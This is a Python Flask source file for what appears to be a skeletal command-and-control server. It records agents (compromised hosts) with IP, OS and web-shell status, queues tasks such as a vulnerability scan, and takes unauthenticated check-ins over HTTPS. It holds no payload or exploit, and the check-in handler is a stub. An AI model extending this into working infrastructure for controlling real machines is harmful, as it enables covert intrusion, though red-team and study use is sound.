import os
import time
import uuid
import json
from datetime import datetime
import mysql.connector
from flask import Flask, render_template, request, jsonify, Response
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "default_secret_key")

# ------------------------ BEGIN DATABASE FUNCTIONS ------------------------ #
# Function to retrieve DB connection
def get_db_connection():
    conn = mysql.connector.connect(
        host=os.getenv("DB_HOST", "localhost"),
        user=os.getenv("DB_USER", "root"),
        password=os.getenv("DB_PASSWORD", ""),
        database=os.getenv("DB_DATABASE", "c2db")
    )
    return conn

# Function to create tables if they don't exist
def create_tables():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Create agents table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS agents (
        id INT AUTO_INCREMENT PRIMARY KEY,
        uuid VARCHAR(36) UNIQUE NOT NULL,
        ip_address VARCHAR(50) NOT NULL,
        last_checkin BIGINT NOT NULL,
        status VARCHAR(50) NOT NULL,
        os VARCHAR(50),
        os_version VARCHAR(50),
        web_shell_active BOOLEAN DEFAULT false
    )
    ''')
    
    # Create tasks table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS tasks (
        id INT AUTO_INCREMENT PRIMARY KEY,
        task_id VARCHAR(36) UNIQUE NOT NULL,
        description VARCHAR(255) NOT NULL,
        status VARCHAR(50) NOT NULL,
        assigned_at BIGINT NOT NULL,
        agent_id INT NOT NULL,
        FOREIGN KEY (agent_id) REFERENCES agents(id)
    )
    ''')
    
    conn.commit()
    conn.close()

# Function to get all agents with their tasks
def get_all_agents():
    conn = get_db_connection()
    cursor = conn.cursor(dictionary=True)
    
    # Query agents
    query = "SELECT id, uuid, ip_address, last_checkin, status, os, os_version, web_shell_active FROM agents"
    cursor.execute(query)
    agents_data = cursor.fetchall()
    
    # For each agent, get their tasks
    for agent in agents_data:
        agent_id = agent['id']
        query = "SELECT task_id, description, status, assigned_at FROM tasks WHERE agent_id = %s"
        cursor.execute(query, (agent_id,))
        tasks = cursor.fetchall()
        
        # Convert to format matching the original app
        agent['ID'] = agent.pop('uuid')
        agent['IPAddress'] = agent.pop('ip_address')
        agent['LastCheckin'] = agent.pop('last_checkin')
        agent['Status'] = agent.pop('status')
        agent['Os'] = agent.pop('os')
        agent['OsVersion'] = agent.pop('os_version')
        agent['WebShellActive'] = agent.pop('web_shell_active')
        agent['Tasks'] = []
        
        for task in tasks:
            task_data = {
                'TaskID': task['task_id'],
                'Description': task['description'],
                'Status': task['status'],
                'AssignedAt': task['assigned_at']
            }
            agent['Tasks'].append(task_data)
    
        # Remove internal database ID
        agent.pop('id')
        
    conn.close()
    return agents_data

# Function to insert or update agent
def save_agent(agent_uuid, ip_address, status, os_name=None, os_version=None, web_shell_active=False):
    conn = get_db_connection()
    cursor = conn.cursor(dictionary=True)
    
    # Check if agent exists
    query = "SELECT id FROM agents WHERE uuid = %s"
    cursor.execute(query, (agent_uuid,))
    result = cursor.fetchone()
    
    if result:
        # Update existing agent
        query = """
        UPDATE agents 
        SET ip_address = %s, last_checkin = %s, status = %s, os = %s, os_version = %s, web_shell_active = %s
        WHERE uuid = %s
        """
        cursor.execute(query, (ip_address, int(time.time()), status, os_name, os_version, web_shell_active, agent_uuid))
        agent_id = result['id']
    else:
        # Insert new agent
        query = """
        INSERT INTO agents (uuid, ip_address, last_checkin, status, os, os_version, web_shell_active)
        VALUES (%s, %s, %s, %s, %s, %s, %s)
        """
        cursor.execute(query, (agent_uuid, ip_address, int(time.time()), status, os_name, os_version, web_shell_active))
        agent_id = cursor.lastrowid
    
    conn.commit()
    conn.close()
    return agent_id

# Function to add a task for an agent
def add_task(agent_id, task_id, description, status="Pending"):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    query = """
    INSERT INTO tasks (task_id, description, status, assigned_at, agent_id)
    VALUES (%s, %s, %s, %s, %s)
    """
    cursor.execute(query, (task_id, description, status, int(time.time()), agent_id))
    
    conn.commit()
    conn.close()

# Function to update task status
def update_task_status(task_id, status):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    query = "UPDATE tasks SET status = %s WHERE task_id = %s"
    cursor.execute(query, (status, task_id))
    
    conn.commit()
    conn.close()

# ------------------------ END DATABASE FUNCTIONS ------------------------ #

# ------------------------ BEGIN ROUTES ------------------------ #
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/displayagents', methods=['GET'])
def display_agents():
    agents = get_all_agents()
    return jsonify(agents)

@app.route('/checkin', methods=['POST'])
def checkin_handler():
    # Implement checkin functionality
    return jsonify({"status": "success"})

@app.route('/deviceinfo', methods=['POST'])
def get_device_info():
    # Gets client's IP, OS, and OS version and stores it in the database
    if request.method == 'POST':
        data = request.json
        
        agent_uuid = data.get('uuid', str(uuid.uuid4()))
        ip_address = request.remote_addr
        os_name = data.get('os', '')
        os_version = data.get('os_version', '')
        
        save_agent(
            agent_uuid=agent_uuid,
            ip_address=ip_address,
            status="Active",
            os_name=os_name,
            os_version=os_version
        )
        
        return jsonify({"status": "success", "agent_id": agent_uuid})
    
    return jsonify({"status": "error", "message": "Method not allowed"}), 405

@app.route('/searchdevices', methods=['GET'])
def search_devices():
    # Implement search functionality
    return jsonify({"status": "not implemented"})

@app.route('/status', methods=['POST'])
def declare_status():
    # Checks if listener is still active on device
    if request.method == 'POST':
        data = request.json
        agent_uuid = data.get('uuid')
        
        if not agent_uuid:
            return jsonify({"status": "error", "message": "UUID required"}), 400
        
        status = data.get('status', 'Active')
        ip_address = request.remote_addr
        
        save_agent(
            agent_uuid=agent_uuid,
            ip_address=ip_address,
            status=status
        )
        
        return jsonify({"status": "success"})
    
    return jsonify({"status": "error", "message": "Method not allowed"}), 405

# ------------------------ END ROUTES ------------------------ #

# ------------------------ DATABASE SETUP ------------------------ #
def setup_database():
    # Create tables
    create_tables()
    
    # Check if we need to add a test agent
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Check if any agents exist
    cursor.execute("SELECT COUNT(*) FROM agents")
    agent_count = cursor.fetchone()[0]
    
    if agent_count == 0:
        # Add a test agent
        test_uuid = str(uuid.uuid4())
        agent_id = save_agent(
            agent_uuid=test_uuid,
            ip_address="192.168.23.14",
            status="Active",
            os_name="Windows 10",
            os_version="10.3.5"
        )
        
        # Add a test task
        add_task(
            agent_id=agent_id,
            task_id="001",
            description="Vuln Scan",
            status="In Progress"
        )
        
        print("Test agent and task created successfully")
    
    conn.close()

# ------------------------ MAIN ------------------------ #
if __name__ == '__main__':
    setup_database()
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 443)), ssl_context='adhoc')
